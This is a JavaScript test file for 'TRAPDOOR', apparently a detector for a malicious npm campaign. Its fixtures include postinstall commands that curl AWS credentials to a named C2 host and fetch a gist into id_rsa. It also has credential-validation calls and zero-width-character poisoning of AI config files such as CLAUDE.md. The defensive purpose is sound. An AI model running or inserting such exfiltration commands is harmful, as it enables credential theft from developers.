import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/trapdoor/index.js';
import { scanCampaignMarker } from '../backend/detectors/trapdoor/d1-campaign-marker.js';
import { scanPayloadFingerprint } from '../backend/detectors/trapdoor/d2-payload-fingerprint.js';
import { scanPublisherBlocklist } from '../backend/detectors/trapdoor/d3-publisher-blocklist.js';
import { scanGistsExfil } from '../backend/detectors/trapdoor/d4-gists-exfil.js';
import { scanAIPoisoning } from '../backend/detectors/trapdoor/d5-ai-poisoning.js';
import { scanLureName } from '../backend/detectors/trapdoor/d6-lure-name.js';
import { scanCryptoPrimitives } from '../backend/detectors/trapdoor/d7-crypto-primitives.js';
import { scanXorKey } from '../backend/detectors/trapdoor/d8-xor-key.js';
import { scanCredValidation } from '../backend/detectors/trapdoor/d9-cred-validation.js';

function makeFile(path, content) {
  return { path, content };
}

const cleanPkg = { name: 'safe-package', version: '1.0.0', scripts: {} };
const cleanRegistryMeta = {
  time: { '1.0.0': '2026-01-01T00:00:00.000Z' },
  versions: {
    '1.0.0': { _npmUser: { name: 'safe-publisher' }, dist: { integrity: 'sha512-abc' } },
  },
};

// ─── D1: Campaign marker scan ────────────────────────────────────────

test('D1: detects P-2024-001 in README.md', () => {
  const files = [makeFile('README.md', 'This project addresses P-2024-001 security audit')];
  const result = scanCampaignMarker(files);
  assert.equal(result.triggered, true);
  assert.equal(result.matches[0].file, 'README.md');
});

test('D1: detects P-2024-001 in .cursorrules', () => {
  const files = [makeFile('.cursorrules', 'campaign: P-2024-001')];
  const result = scanCampaignMarker(files);
  assert.equal(result.triggered, true);
});

test('D1: detects P-2024-001 in package.json', () => {
  const files = [makeFile('package.json', JSON.stringify({ campaign: 'P-2024-001' }))];
  const result = scanCampaignMarker(files);
  assert.equal(result.triggered, true);
});

test('D1: detects P-2024-001 in .sh file', () => {
  const files = [makeFile('build.sh', 'echo "P-2024-001"')];
  const result = scanCampaignMarker(files);
  assert.equal(result.triggered, true);
});

test('D1: does not flag non-target files', () => {
  const files = [makeFile('src/index.js', 'P-2024-001')];
  const result = scanCampaignMarker(files);
  assert.equal(result.triggered, false);
});

test('D1: does not trigger on clean content', () => {
  const files = [makeFile('README.md', '# Safe package')];
  const result = scanCampaignMarker(files);
  assert.equal(result.triggered, false);
});

// ─── D2: Payload fingerprint ──────────────────────────────────────────

test('D2: detects trap-core.js by filename', () => {
  const files = [makeFile('lib/trap-core.js', 'console.log("hello");')];
  const result = scanPayloadFingerprint(files);
  assert.equal(result.triggered, true);
  assert.equal(result.matches[0].matchType, 'filename');
});

test('D2: detects 48,485 byte file', () => {
  const content = 'x'.repeat(48485);
  const files = [makeFile('lib/payload.js', content)];
  const result = scanPayloadFingerprint(files);
  assert.equal(result.triggered, true);
  assert.equal(result.matches[0].matchType, 'byteSize');
});

test('D2: does not trigger on normal files', () => {
  const files = [makeFile('index.js', 'module.exports = {};')];
  const result = scanPayloadFingerprint(files);
  assert.equal(result.triggered, false);
});

// ─── D3: Publisher blocklist ──────────────────────────────────────────

test('D3: blocks asdxzxc publisher', () => {
  const pkg = { name: 'evil-pkg', version: '1.0.0' };
  const meta = {
    time: { '1.0.0': '2026-05-25T00:00:00.000Z' },
    versions: { '1.0.0': { _npmUser: { name: 'asdxzxc' } } },
  };
  const result = scanPublisherBlocklist(pkg, meta);
  assert.equal(result.triggered, true);
  assert.equal(result.publisher, 'asdxzxc');
});

test('D3: does not block clean publisher', () => {
  const pkg = { name: 'safe-pkg', version: '1.0.0' };
  const meta = {
    time: { '1.0.0': '2026-01-01T00:00:00.000Z' },
    versions: { '1.0.0': { _npmUser: { name: 'safe-publisher' } } },
  };
  const result = scanPublisherBlocklist(pkg, meta);
  assert.equal(result.triggered, false);
});

test('D3: no trigger when registryMeta is null', () => {
  const result = scanPublisherBlocklist(cleanPkg, null);
  assert.equal(result.triggered, false);
});

// ─── D4: Gists exfiltration ──────────────────────────────────────────

test('D4: detects ddjidd564.github.io + .aws/ in postinstall', () => {
  const pkg = {
    name: 'test',
    scripts: { postinstall: 'curl http://ddjidd564.github.io/steal -d @~/.aws/credentials' },
  };
  const result = scanGistsExfil([], pkg);
  assert.equal(result.triggered, true);
  assert.equal(result.matches[0].file, 'script:postinstall');
});

test('D4: detects gist.github.com + id_rsa in JS source', () => {
  const files = [
    makeFile(
      'index.js',
      'fetch("https://gist.github.com/raw/abc").then(r => r.text()).then(d => fs.writeFileSync("id_rsa", d))'
    ),
  ];
  const result = scanGistsExfil(files, cleanPkg);
  assert.equal(result.triggered, true);
});

test('D4: does not trigger on C2 without credential path', () => {
  const files = [makeFile('index.js', 'fetch("https://ddjidd564.github.io")')];
  const result = scanGistsExfil(files, cleanPkg);
  assert.equal(result.triggered, false);
});

test('D4: does not trigger on clean code', () => {
  const files = [makeFile('index.js', 'module.exports = {}')];
  const result = scanGistsExfil(files, cleanPkg);
  assert.equal(result.triggered, false);
});

// ─── D5: AI poisoning ─────────────────────────────────────────────────

test('D5: detects zero-width chars in .cursorrules', () => {
  const files = [makeFile('.cursorrules', 'safe\u200Btext')];
  const result = scanAIPoisoning(files);
  assert.equal(result.triggered, true);
  assert.equal(result.matches[0].count, 1);
  assert.equal(result.matches[0].zeroWidthChars[0].char, 'U+200B');
});

test('D5: detects multiple zero-width chars in CLAUDE.md', () => {
  const files = [makeFile('CLAUDE.md', '\uFEFF# Important\n\u200Crule')];
  const result = scanAIPoisoning(files);
  assert.equal(result.triggered, true);
  assert.equal(result.matches[0].count, 2);
});

test('D5: does not trigger on clean .cursorrules', () => {
  const files = [makeFile('.cursorrules', '# Safe rules\nno hidden chars')];
  const result = scanAIPoisoning(files);
  assert.equal(result.triggered, false);
});

test('D5: does not scan non-target files', () => {
  const files = [makeFile('index.js', '\u200Bvar x = 1;')];
  const result = scanAIPoisoning(files);
  assert.equal(result.triggered, false);
});

// ─── D6: Crypto/DeFi lure name ────────────────────────────────────────

test('D6: flags new solidity-named package', () => {
  const pkg = { name: 'solidity-contract-helper', version: '1.0.0' };
  const meta = {
    time: { '1.0.0': new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString() },
    versions: { '1.0.0': { _npmUser: { name: 'someuser' } } },
  };
  const result = scanLureName(pkg, meta);
  assert.equal(result.triggered, true);
  assert.match(result.matchedPattern, /solidity/i);
});

test('D6: flags defi-patterned package', () => {
  const pkg = { name: 'defi-lending-protocol', version: '1.0.0' };
  const meta = {
    time: { '1.0.0': new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString() },
    versions: { '1.0.0': { _npmUser: { name: 'someuser' } } },
  };
  const result = scanLureName(pkg, meta);
  assert.equal(result.triggered, true);
});

test('D6: does not flag old package', () => {
  const pkg = { name: 'solana-sdk', version: '1.0.0' };
  const meta = {
    time: { '1.0.0': new Date(Date.now() - 60 * 24 * 60 * 60 * 1000).toISOString() },
    versions: { '1.0.0': { _npmUser: { name: 'someuser' } } },
  };
  const result = scanLureName(pkg, meta);
  assert.equal(result.triggered, false);
});

test('D6: does not flag non-matching name', () => {
  const pkg = { name: 'lodash', version: '1.0.0' };
  const meta = {
    time: { '1.0.0': new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString() },
    versions: { '1.0.0': { _npmUser: { name: 'someuser' } } },
  };
  const result = scanLureName(pkg, meta);
  assert.equal(result.triggered, false);
});

// ─── D7: Crypto primitives ────────────────────────────────────────────

test('D7: detects Fernet + ECDH in postinstall', () => {
  const pkg = {
    name: 'test',
    scripts: {
      postinstall:
        'node -e "const Fernet = require("fernet"); const ecdh = require("crypto").createECDH("secp256k1")"',
    },
  };
  const result = scanCryptoPrimitives([], pkg);
  assert.equal(result.triggered, true);
});

test('D7: detects Fernet + ECDH in JS source', () => {
  const files = [makeFile('index.js', 'class Fernet { } const ecdh = createECDH("prime256v1")')];
  const result = scanCryptoPrimitives(files, cleanPkg);
  assert.equal(result.triggered, true);
});

test('D7: does not trigger on Fernet alone', () => {
  const pkg = {
    name: 'test',
    scripts: { postinstall: 'const Fernet = require("fernet")' },
  };
  const result = scanCryptoPrimitives([], pkg);
  assert.equal(result.triggered, false);
});

test('D7: does not trigger on ECDH alone', () => {
  const pkg = {
    name: 'test',
    scripts: { postinstall: 'const ecdh = createECDH("secp256k1")' },
  };
  const result = scanCryptoPrimitives([], pkg);
  assert.equal(result.triggered, false);
});

// ─── D8: XOR key in lock files ───────────────────────────────────────

test('D8: detects cargo-build-helper-2026 in Cargo.lock', () => {
  const files = [makeFile('Cargo.lock', 'name = "cargo-build-helper-2026"')];
  const result = scanXorKey(files);
  assert.equal(result.triggered, true);
});

test('D8: detects cargo-build-helper-2026 in package-lock.json', () => {
  const files = [
    makeFile('package-lock.json', JSON.stringify({ packages: { 'cargo-build-helper-2026': {} } })),
  ];
  const result = scanXorKey(files);
  assert.equal(result.triggered, true);
});

test('D8: does not trigger on normal files', () => {
  const files = [makeFile('index.js', 'cargo-build-helper-2026')];
  const result = scanXorKey(files);
  assert.equal(result.triggered, false);
});

// ─── D9: Credential validation ────────────────────────────────────────

test('D9: detects sts.amazonaws.com in postinstall', () => {
  const pkg = {
    name: 'test',
    scripts: {
      postinstall: 'curl -X POST https://sts.amazonaws.com/ -d "Action=GetCallerIdentity"',
    },
  };
  const result = scanCredValidation([], pkg);
  assert.equal(result.triggered, true);
  assert.equal(result.matches[0].file, 'script:postinstall');
});

test('D9: detects api.github.com/user in JS source', () => {
  const files = [
    makeFile('index.js', 'fetch("https://api.github.com/user").then(r => console.log(r))'),
  ];
  const result = scanCredValidation(files, cleanPkg);
  assert.equal(result.triggered, true);
});

test('D9: does not trigger on clean postinstall', () => {
  const pkg = {
    name: 'test',
    scripts: { postinstall: 'echo "done"' },
  };
  const result = scanCredValidation([], pkg);
  assert.equal(result.triggered, false);
});

// ─── Composite scan ───────────────────────────────────────────────────

test('TRAPDOOR: returns empty for clean package', async () => {
  const findings = await scan(cleanPkg, [], cleanRegistryMeta, []);
  assert.equal(findings.length, 0);
});

test('TRAPDOOR: returns finding with critical severity when D1 triggers', async () => {
  const files = [makeFile('README.md', 'P-2024-001')];
  const findings = await scan(cleanPkg, [], cleanRegistryMeta, files);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].id, 'TRAPDOOR');
  assert.equal(findings[0].severity, 'critical');
});

test('TRAPDOOR: returns finding when D3 triggers', async () => {
  const pkg = { name: 'evil-pkg', version: '1.0.0', scripts: {} };
  const meta = {
    time: { '1.0.0': '2026-05-25T00:00:00.000Z' },
    versions: { '1.0.0': { _npmUser: { name: 'asdxzxc' } } },
  };
  const findings = await scan(pkg, [], meta, []);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'critical');
  const evidence = JSON.parse(findings[0].evidence);
  assert.deepEqual(evidence.triggeredRules, ['D3']);
});

test('TRAPDOOR: multiple triggers resolve to highest severity', async () => {
  const pkg = { name: 'solidity-lib', version: '1.0.0', scripts: {} };
  const meta = {
    time: { '1.0.0': new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString() },
    versions: { '1.0.0': { _npmUser: { name: 'someuser' } } },
  };
  const files = [makeFile('.cursorrules', 'safe\u200Btext')];
  const findings = await scan(pkg, [], meta, files);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'high');
  const evidence = JSON.parse(findings[0].evidence);
  assert.ok(evidence.triggeredRules.includes('D5'));
  assert.ok(evidence.triggeredRules.includes('D6'));
});

test('TRAPDOOR: D2+D3+D4 all trigger simultaneously', async () => {
  const pkg = {
    name: 'evil-pkg',
    version: '1.0.0',
    scripts: { postinstall: 'curl http://ddjidd564.github.io -d @~/.aws/credentials' },
  };
  const meta = {
    time: { '1.0.0': '2026-05-25T00:00:00.000Z' },
    versions: { '1.0.0': { _npmUser: { name: 'asdxzxc' } } },
  };
  const files = [
    makeFile('lib/trap-core.js', 'var x=1;'),
    makeFile('README.md', 'P-2024-001'),
    makeFile('.cursorrules', '\u200Bhidden'),
  ];
  const findings = await scan(pkg, [], meta, files);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'critical');
  const evidence = JSON.parse(findings[0].evidence);
  assert.ok(evidence.triggeredRules.includes('D1'));
  assert.ok(evidence.triggeredRules.includes('D2'));
  assert.ok(evidence.triggeredRules.includes('D3'));
  assert.ok(evidence.triggeredRules.includes('D4'));
  assert.ok(evidence.triggeredRules.includes('D5'));
});

test('TRAPDOOR: evidence contains campaign metadata', async () => {
  const pkg = { name: 'test', version: '1.0.0', scripts: {} };
  const meta = {
    time: { '1.0.0': '2026-05-25T00:00:00.000Z' },
    versions: { '1.0.0': { _npmUser: { name: 'asdxzxc' } } },
  };
  const findings = await scan(pkg, [], meta, []);
  const evidence = JSON.parse(findings[0].evidence);
  assert.equal(evidence.campaign, 'TRAPDOOR');
  assert.equal(evidence.iocSummary.publisher, 'asdxzxc');
  assert.equal(evidence.iocSummary.c2Domain, 'ddjidd564.github.io');
  assert.equal(evidence.iocSummary.campaignMarker, 'P-2024-001');
  assert.equal(evidence.iocSummary.payloadFile, 'trap-core.js');
});
